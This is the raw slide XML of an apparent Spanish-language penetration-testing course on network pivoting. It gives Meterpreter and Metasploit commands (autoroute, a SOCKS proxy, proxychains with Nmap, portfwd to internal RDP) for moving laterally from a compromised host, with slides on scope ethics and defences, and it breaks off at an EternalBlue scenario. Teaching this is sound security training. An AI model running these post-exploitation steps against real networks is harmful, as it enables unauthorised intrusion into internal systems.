              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>Burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t>, etc.) a través de la sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Paso A: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0"/>
              <a:t>Obtener la Sesión Inicial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Requisito:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> Una sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> activa en el Host Cebo (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> -i 1).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Paso B: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0"/>
              <a:t>Mapear la Nueva Red</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> Descubrir la IP interna de la máquina comprometida.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Comando en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>ipconfig</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" i="1" dirty="0"/>
              <a:t>(Ejemplo: El atacante ve 192.168.1.100, pero el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" i="1" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" i="1" dirty="0"/>
              <a:t> ve 192.168.1.100 y 10.10.10.5.)</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Conclusión:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> La nueva red interna es 10.10.10.0/24.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Paso C: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0"/>
              <a:t>Agregar la Ruta de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1400" b="1" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> Decirle a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> que use la sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> como una ruta para llegar a la red interna.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t>run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>autoroute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> -s 10.10.10.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t># -s: Define la subred interna a la que queremos acceder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>Verificación de la Ruta:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>route</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0" err="1"/>
              <a:t>print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t> (Para ver si la nueva ruta se agregó correctamente).</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1484811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FCE3064-4B3D-1D84-7F5C-069F9AFB7EB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="548680"/>
            <a:ext cx="1108923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b="1" dirty="0"/>
              <a:t>Paso D: Montar el Proxy SOCKS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> Crear un servicio SOCKS en la máquina del atacante (Kali) que envíe todo el tráfico a través del túnel de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>auxiliary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>/server/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>socks_proxy</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>set SRVHOST 127.0.0.1  # Escucha localmente en la máquina del atacante</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>set SRVPORT 1080       # Puerto estándar para SOCKS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Resultado:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> Ahora tienes un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" i="1" dirty="0"/>
              <a:t>proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> SOCKS activo en tu máquina que canaliza el tráfico a la red </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>10.10.10.0/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-MX" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" b="1" dirty="0"/>
              <a:t>Paso E: Uso de Herramientas Externas</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> Configurar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> para usar el túnel SOCKS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" b="1" dirty="0"/>
              <a:t>Comando en Kali (Terminal separada):</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Se recomienda usar la herramienta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> para canalizar el tráfico. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Sintaxis: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> 10.10.10.5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-MX" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-CL" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Explicación:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> obliga a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> (y otras herramientas) a enviar sus paquetes al puerto </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>1080</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> de tu máquina local, que luego </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> envía a la red </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>10.10.10.0/24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1405850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7C8164D-2051-93DA-F900-0A63EDF71247}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1989956" y="332656"/>
            <a:ext cx="4976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800" dirty="0"/>
              <a:t>Port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="2800" dirty="0" err="1"/>
              <a:t>Forwarding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="2800" dirty="0"/>
              <a:t>: El Túnel Directo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2C80F3A-0970-D13A-F267-87399D08D873}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1197868" y="872341"/>
            <a:ext cx="10225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800" dirty="0"/>
              <a:t>Este método es más simple y se utiliza cuando solo se necesita acceder a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>un servicio específico</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>(Ej. un RDP, un SSH o una base de datos) en la red interna, sin exponer toda la subred</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="18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A38087E-A58E-3567-3F64-229ADFF1ECB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="1535136"/>
            <a:ext cx="11161240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800" b="1" dirty="0"/>
              <a:t>Paso A: Identificar el Servicio Oculto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Se asume que el atacante ya sabe que el Host Interno (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>10.10.10.5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>) tiene el puerto </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>3389 (RDP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> abierto (descubierto con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> vía SOCKS Proxy).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Paso B: Crear la Regla de Redirección</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> Crear un túnel entre un puerto de la máquina del atacante y el servicio interno.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>portfwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> -l 3333 -p 3389 -r 10.10.10.5 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t># -l 3333: Puerto Local (en la máquina atacante)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> # -p 3389: Puerto Remoto (en el host interno) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t># -r 10.10.10.5: Host Remoto (el servidor interno)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>Paso C: Acceso Directo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>Objetivo:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> Conectarse al servicio interno utilizando un puerto local.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>Acción:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> El atacante simplemente abre su cliente RDP y se conecta a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>127.0.0.1:3333</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" i="1" dirty="0"/>
              <a:t>(El RDP se conecta localmente, el túnel de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" i="1" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" i="1" dirty="0"/>
              <a:t> lo redirige al Host Interno.)</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="es-MX" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1925461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92242BF-9789-54AF-9D78-B9B68256F4A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2998068" y="476672"/>
            <a:ext cx="51225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800" dirty="0"/>
              <a:t>Consideraciones Éticas y Defensas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D2E1063-13ED-B9A7-D45F-C713985ED07C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837829" y="966934"/>
            <a:ext cx="11233248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/>
              <a:t>1. Consideraciones Éticas:</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>El Alcance es Sagrado:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> En un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>pentesting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> real, el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> solo se realiza si está explícitamente autorizado en el documento de alcance. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>Nunca se debe pivotar a redes que no están en el contrato.</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>Documentación Rigurosa:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> Cada salto (cada </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>autoroute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>) debe ser documentado y justificado.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>2. Defensas (Mitigación del Riesgo):</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>Firewalls Salientes:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> El atacante necesita que el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>) se conecte de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>salida</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>Bloquear todas las conexiones de salida innecesarias (excepto 80/443/DNS) hace que la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>reverse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> falle o sea detectada.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>Monitorización de ARP/Tráfico Interno:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> Monitorear el tráfico interno para detectar el tráfico inusual (como los paquetes de escaneo de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> que viajan por el túnel).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Micro-segmentación</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> Usar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>VLANs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> o firewalls en la red interna para que el Host Cebo, una vez comprometido, solo pueda acceder a los servidores absolutamente necesarios, limitando así el movimiento lateral.</a:t>
            </a:r>
          </a:p>
          <a:p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2685184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C044F5E-827B-AFC6-E864-7F096E81C4A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1917948" y="332656"/>
            <a:ext cx="75445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dirty="0"/>
              <a:t>Flujo de Ataque: De </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2800" dirty="0" err="1"/>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2800" dirty="0"/>
              <a:t> al </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2800" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2800" dirty="0"/>
              <a:t> Interno</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="28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8C6C90-4AF2-302F-D7F1-0A99EA5A29D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1053852" y="1052736"/>
            <a:ext cx="103691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800" dirty="0"/>
              <a:t>El escenario es: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>La </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Máquina 1 (Víctima Externa)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> es vulnerable a MS17-010. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
